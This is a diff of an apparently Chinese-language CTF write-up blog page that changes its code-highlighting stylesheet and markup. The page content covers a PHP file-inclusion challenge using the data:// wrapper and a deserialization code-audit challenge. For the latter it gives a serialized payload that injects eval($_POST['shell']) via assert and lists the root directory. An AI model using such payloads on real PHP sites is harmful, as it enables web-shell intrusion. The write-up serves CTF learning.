@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -248,7 +256,7 @@
               <h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><ul>
 <li>文件包含</li>
 </ul>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
 <span class="hljs-comment">/*</span>
 <span class="hljs-comment"># -*- coding: utf-8 -*-</span>
@@ -268,7 +276,7 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
     <span class="hljs-keyword">if</span>($ext===<span class="hljs-string">&#x27;php&#x27;</span>)&#123;
         <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];
     &#125;
-&#125;</code></pre></div></code></pre>
+&#125;</code></pre></code></pre>
 <p><code>pathinfo</code>要求传入的<code>file</code>后缀名为<code>php</code>，就会<code>include</code>      </p>
 <p>看到include要想到伪协议了    </p>
 <p>这里用<code>data://text/plain</code>     </p>
@@ -278,7 +286,7 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
 <h2 id="cjbweb"><a href="#cjbweb" class="headerlink" title="cjbweb"></a>cjbweb</h2><ul>
 <li>代码审计</li>
 </ul>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 error_reporting(<span class="hljs-number">0</span>);
 $safe=<span class="hljs-string">&quot;Hack me!&quot;</span>;
 
@@ -312,7 +320,7 @@ $safe=<span class="hljs-string">&quot;Hack me!&quot;</span>;
 &#125;<span class="hljs-keyword">else</span>&#123;
     $hacker=<span class="hljs-keyword">new</span> Hacker();
     highlight_file(<span class="hljs-keyword">__FILE__</span>);
-&#125;</code></pre></div></code></pre>
+&#125;</code></pre></code></pre>
 <ul>
 <li><p>第一种思路：在类中写两次相同的属性名，后面的属性值会覆盖前面的属性值（类的属性个数要加1）<br>  <code>\([^()]*\([^()]*\)</code>这条正则过滤的时括号嵌套<code>(())</code>   </p>
 <p>  payload:<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:22:&quot;eval($_POST[&#39;shell&#39;]);&quot;;&#125;&amp;&amp;shell=var_dump(scandir(&#39;/&#39;));</code><br>  <img src="https://ftp.bmp.ovh/imgs/2021/07/f084c58e911870b0.png" srcset="/img/loading.gif">    </p>
@@ -479,6 +487,8 @@ $safe=<span class="hljs-string">&quot;Hack me!&quot;</span>;
 
 
 
+  
+    
   
 
 
